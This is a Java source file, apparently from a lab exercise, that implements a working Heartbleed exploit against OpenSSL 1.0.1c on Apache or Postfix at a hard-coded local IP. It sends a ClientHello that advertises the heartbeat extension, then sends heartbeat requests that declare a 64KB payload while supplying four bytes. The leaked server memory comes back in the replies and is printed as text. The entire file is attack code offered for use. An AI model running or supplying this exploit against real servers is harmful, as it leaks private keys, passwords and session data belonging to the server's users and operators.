import java.net.Socket;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.ByteBuffer;
import java.net.ConnectException;


/*
 * Represents Heartbleed class for performing Heartbleed attack on vulnurable server running OpenSSL 1.0.1c on Apache and Postfix
 */
public class Heartbleed implements AutoCloseable {
    // represents our heartbleed attack parameters
    private static final int APACHE_PORT = 443; //represents Apahche2 SSL port
    private static final int POSTFIX_PORT = 465; //represents Postfix SSL port
    private static final String SERVER_IP = "192.168.1.132"; //represents vulnurable server IP
    private static final int SERVER_PORT = APACHE_PORT; //represents vulnurable server port, APACHE_PORT or POSTFIX_PORT
    private static final String PAYLOAD = "bird"; //represents heartbeat message payload (short)
    private static final int PAYLOAD_LEN = 65535; //represents heartbeat message payload length (long - 64KB)
    private static final int NUM_OF_MESSAGES = 4; //represents number of heartbeat messages to send to server

    // represents our socket with output and input streams
    private Socket socket;
    private OutputStream out;
    private InputStream in;


    /*
     * Represents constructor of heartbleed class.
     * Connects to our vulnurable SSL server with cilent hello for initializing connection.
     * Throws exeption if SSL handshake fails.
     */
    public Heartbleed(String serverIp, int serverPort) throws Exception {
        //connect to vulnurable server in desired IP and port
        connect(serverIp, serverPort);

        // send client hello for initalizing handshake
        byte[] clientHello = getClientHello();
        System.out.println("Sending ClientHello for initial handshake");
        this.out.write(clientHello);
        this.out.flush();
        Thread.sleep(500);

        // read handshake response and print it in terminal
        byte[] handshakeBuffer = new byte[2048];
        int handshakeBytes = readResponse(handshakeBuffer);
        if (handshakeBytes > 0) 
            System.out.println("Handshake response (" + handshakeBytes + " bytes) received\n");
        else 
            throw new Exception("Handshake failed: No response from server\n");
    }


    /*
     * Represents connect method for connecting to server with desired port.
     * Throws exeption if connection failed or error occured.
     */
    private void connect(String serverIp, int serverPort) throws Exception {
        try {
            this.socket = new Socket(serverIp, serverPort); //create new socket with desired server IP and port
            this.out = this.socket.getOutputStream(); //initalize output stream for socket
            this.in = this.socket.getInputStream(); //initalize input stream for socket
            System.out.println("Connected to " + serverIp + ":" + serverPort);
        }
        catch (ConnectException e) {
            // thorw connection failure exeption if failed to connect
            throw new Exception("Connection failed: Is server running on " + serverIp + ":" + serverPort + "?");
        }
        catch (Exception e) {
            // thorw exeption if error occured
            throw new Exception("Error: " + e.getMessage());
        }
    }


    /*
     * Represents close method for closing our socket and its input and output streams.
     */
    @Override
    public void close() throws Exception {
        if (this.out != null)
            this.out.close();
        if (this.in != null)
            this.in.close();
        if (this.socket != null)
            this.socket.close();
    }


    /*
     * Represents ClientHello message to initialize handshake between client and server.
     */
    private byte[] getClientHello() {
        byte[] clientHello = new byte[] {
            0x16, 0x03, 0x01, 0x00, 0x36, // Handshake, TLS 1.0, length 54
            0x01, 0x00, 0x00, 0x32,       // ClientHello, length 50
            0x03, 0x01,                   // TLS 1.0
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00,                         // Session ID length: 0
            0x00, 0x04,                   // Cipher suites length: 4
            0x00, 0x04, 0x00, 0x05,       // TLS_RSA_WITH_RC4_128_MD5, TLS_RSA_WITH_RC4_128_SHA
            0x01, 0x00,                   // Compression: null
            0x00, 0x05,                   // Extensions length: 5
            0x00, 0x0f, 0x00, 0x01, 0x01  // Heartbeat extension
        };
        return clientHello;
    }


    /*
     * Represents Heartbeat message to send to server with desired parameters.
     */
    private byte[] getHeartbeat() {
        ByteBuffer buffer = ByteBuffer.allocate(5 + 3 + PAYLOAD.length() + 2);
        buffer.put((byte) 0x18);                             // Heartbeat
        buffer.put((byte) 0x03);                             // TLS 1.0
        buffer.put((byte) 0x01);                             // TLS 1.0
        buffer.putShort((short) (3 + PAYLOAD.length() + 2)); // Length
        buffer.put((byte) 1);                                // Request
        buffer.putShort((short) PAYLOAD_LEN);                // Declared payload len
        buffer.put(PAYLOAD.getBytes());                      // Actual payload message
        buffer.putShort((short) 16);                         // Padding
        return buffer.array();
    }


    /*
     * Represents method for sending heartbeat messages to server.
     * Sends the number of messages specified.
     * Throws exeption if failed sending message.
     */
    public void sendHeartbeats(int numOfMessages) throws Exception {
        // get heartbeat message
        byte[] heartbeat = getHeartbeat();

        // send heartbeat messages to server in desired amount
        for (int i = 0; i < numOfMessages; i++) {
            try {
                // send heartbeat message to server
                System.out.println("Sending Heartbeat " + (i + 1));
                this.out.write(heartbeat);
                this.out.flush();
                
                // read the response and print to termial
                byte[] buffer = new byte[PAYLOAD_LEN + 10];
                int bytesRead = readResponse(buffer);
                if (bytesRead > 0) {
                    System.out.println("Heartbeat " + (i + 1) + " response (" + bytesRead + " bytes):");
                    printResponse(buffer, bytesRead, false); //print in text format
                }
                else {
                    System.out.println("No response for Heartbeat " + (i + 1));
                    break;
                }
                Thread.sleep(200);

            }
            catch (Exception e) {
                // print exeption if occured
                System.out.println("Heartbeat " + (i + 1) + " failed: " + e.getMessage());
                break;
            }
        }
    }


    /*
     * Represents method for reading response of message received.
     */
    private int readResponse(byte[] buffer) throws Exception {
        int totalBytes = 0;
        this.socket.setSoTimeout(10000);

        // read bytes into the buffer until it's full or no more data is available
        while (totalBytes < buffer.length) {
            int bytesRead = this.in.read(buffer, totalBytes, buffer.length - totalBytes);

            // means we reached end of stream, we break
            if (bytesRead < 0)
                break;

            totalBytes += bytesRead; //update number of bytes read

            // if no more bytes available, we break
            if (in.available() == 0)
                break;
        }
        return totalBytes;
    }


    /*
     * Represents method for printing message response to terminal in desired format.
     */
    private void printResponse(byte[] buffer, int bytesRead, Boolean isHex) {
        // means we print message in hex format
        if (isHex) {
            System.out.println("Hex:\n");
            for (int i = 0; i < bytesRead; i++) {
                System.out.printf("%02x ", buffer[i]);
                if ((i + 1) % 16 == 0)
                    System.out.println();
            }
        }
        // else we print message in text format (ASCII)
        else {
            System.out.println("Text (ASCII):\n");
            for (int i = 0; i < bytesRead; i++) {
                char c = (char) (buffer[i] & 0xFF);
                // we print characters that fall in the printable ASCII range 0-127, else we print '.'
                if (c < 128 && (Character.isLetterOrDigit(c) || Character.isSpaceChar(c) || c == '@' || c == ':' || c == '.'))
                    System.out.print(c);
                else
                    System.out.print('.');
            }
        }
        System.out.println("\n");
    }



    /*
     * Represents main function, we initiate the attack with desired server IP and port
     */
    public static void main(String[] args) {
        // starting the heartbleed attack on desired server IP and port
        System.out.println("Attacking server on " + SERVER_IP + ":" + SERVER_PORT);

        // initialize connetion with server and send heartbeat messages to exfil leaked data
        try (Heartbleed exploit = new Heartbleed(SERVER_IP, SERVER_PORT)) {
            exploit.sendHeartbeats(NUM_OF_MESSAGES); //send heartbeat messages in desired amount
        }
        catch (Exception e) {
            // if exeption occured we print message
            System.err.println("Attack failed: " + e.getMessage());
        }
    }
}